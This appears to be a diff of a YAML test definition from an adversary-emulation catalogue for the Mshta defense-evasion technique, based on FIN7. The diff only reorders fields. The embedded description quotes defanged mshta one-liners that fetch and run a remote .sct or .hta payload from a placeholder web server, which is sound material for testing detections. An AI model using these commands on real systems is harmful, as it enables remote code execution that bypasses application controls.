@@ -1,17 +1,3 @@
-guid: 906865c3-e05f-4acc-85c4-fbc185455095
-name: Mshta executes VBScript to execute malicious command
-tactic:
-  - defense-evasion
-technique:
-  - T1218.005
-sigma: false
-sigma_rule: []
-os:
-  - windows
-description: |
-  Run a local VB script to run local user enumeration powershell command.
-  This attempts to emulate what FIN7 does with this technique which is using mshta.exe to execute VBScript to execute malicious code on victim systems.
-  Upon execution, a new PowerShell windows will be opened that displays user information.
 Attack_name: Mshta
 Attack_description: "Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types\
   \ of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA)\
@@ -20,3 +6,17 @@ Attack_description: "Adversaries may abuse mshta.exe to proxy execution of malic
   \ mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))</code>\n\nThey may also be executed directly from URLs: <code>mshta\
   \ http[:]//webserver/payload[.]hta</code>\n\nMshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's\
   \ security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)"
+guid: 906865c3-e05f-4acc-85c4-fbc185455095
+name: Mshta executes VBScript to execute malicious command
+tactic:
+  - defense-evasion
+technique:
+  - T1218.005
+os:
+  - windows
+description: |
+  Run a local VB script to run local user enumeration powershell command.
+  This attempts to emulate what FIN7 does with this technique which is using mshta.exe to execute VBScript to execute malicious code on victim systems.
+  Upon execution, a new PowerShell windows will be opened that displays user information.
+sigma: false
+sigma_rule: []
